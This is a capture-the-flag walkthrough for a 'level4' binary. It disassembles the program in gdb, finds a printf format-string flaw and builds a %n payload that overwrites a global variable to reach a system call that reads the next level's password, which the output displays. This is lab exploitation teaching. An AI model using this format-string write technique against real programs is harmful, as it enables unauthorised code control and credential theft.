Execute the *level4* binary:

```bash
./level4
abcd
```

```
abcd
```

> Note the *level4* binary reads the user input from stdin like the *level3*, *level2* and *level1*.

```gdb
disass main
```

> Use __set disassembly-flavor intel__ command to set the intel syntax.

```gdb
Dump of assembler code for function main:
   0x080484a7 <+0>:	push   ebp
   0x080484a8 <+1>:	mov    ebp,esp
   0x080484aa <+3>:	and    esp,0xfffffff0
   0x080484ad <+6>:	call   0x8048457 <n>
   0x080484b2 <+11>:	leave
   0x080484b3 <+12>:	ret
End of assembler dump.
```

Check the *n* function called from the main:

```gdb
disass n
```

```
Dump of assembler code for function n:
...
   0x08048477 <+32>:	mov    DWORD PTR [esp],eax
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>        ; get the user input
   0x0804847f <+40>:	lea    eax,[ebp-0x208]
   0x08048485 <+46>:	mov    DWORD PTR [esp],eax
   0x08048488 <+49>:	call   0x8048444 <p>                ; call the p function
   0x0804848d <+54>:	mov    eax,ds:0x8049810
   0x08048492 <+59>:	cmp    eax,0x1025544                ; compare the "m" global variable to 16930116
   0x08048497 <+64>:	jne    0x80484a5 <n+78>

   0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590
   0x080484a0 <+73>:	call   0x8048360 <system@plt>       ; execute "/bin/cat /home/user/level5/.pass"
...
   0x080484a5 <+78>:	leave
   0x080484a6 <+79>:	ret
End of assembler dump.
```

The *n* function is exactly like the *v* function of the previous binary level *level3* but with some differences:

- The *system* function give us directly the flag instead of open a shell.
- The *p* function is called instead of *printf*.
- The global variable *m* have has a different address: __0x8049810__.
- The global variable *m* is compared to __16930116__ to access to the *system* call instead of __64__.

Check the *p* function:

```gdb
disass p
```

```
Dump of assembler code for function p:
...
   0x0804844d <+9>:	mov    DWORD PTR [esp],eax
   0x08048450 <+12>:	call   0x8048340 <printf@plt>
...
End of assembler dump.
```

The *p* function does nothing but call the *printf* function.

Like the previous level, the goal is to reach the system call.

For reach this instruction, the comparaison of the global variable *m* with the value __16930116__ need to be equal.

```gdb
x 0x8049810
```

```
0x8049810 <m>:	0x00000000
```

But use the precedent exploit with a padding of 16930112 characters/bytes (16930116 - 4) is not possible because the *fgets* allows a maximum string length of 512 characters/bytes.

Fortunately, it's possible to ask to *printf* to print for us these padding bytes using the padding feature (*%\<padding\>\<any format specifier\>*) on the *%d* format specifier for example.

Like the previous level, find the argument position of printf pointing on the first bytes of the input string buffer:

```bash
echo "AAAABBBBCCCC %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p" | ./level4
```

```
AAAABBBBCCCC 0xb7ff26b0 0xbffff684 0xb7fd0ff4 (nil) (nil) 0xbffff648 0x804848d 0xbffff440 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x42424242 0x43434343 0x20702520
```

> The twelfth parameter of the *printf* is the first character of the user input buffer (because AAAA = 0x41414141, BBBB = 0x42424242 ...)

To write in the the global variable *m*:

- Put the address of the global variable *m* at the beginning of the user input (reversed because the stack is readed in the opposite way = \x10\x98\x04\x08) for the *fgets* call.
- Add 16930112 (16930116 minus the global variable *m* address) padding characters/bytes using the *%d* format specifier.
- Add the *%n* special format specifier to put the value 16930116 (the four bytes of the global variable *m* plus the 16930112 paddings bytes).
- Use the *%12$...* permutation option on the *%n* special format specifier for write its value (16930116) in the twelfth parameter of printf which is the start of the user input buffer (starting by the address of the global variable *m* thanks to the step one).

```bash
echo -e "\x10\x98\x04\x08%16930112d%12\$n" | ./level4
```

```
...
                                                -1208015184
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```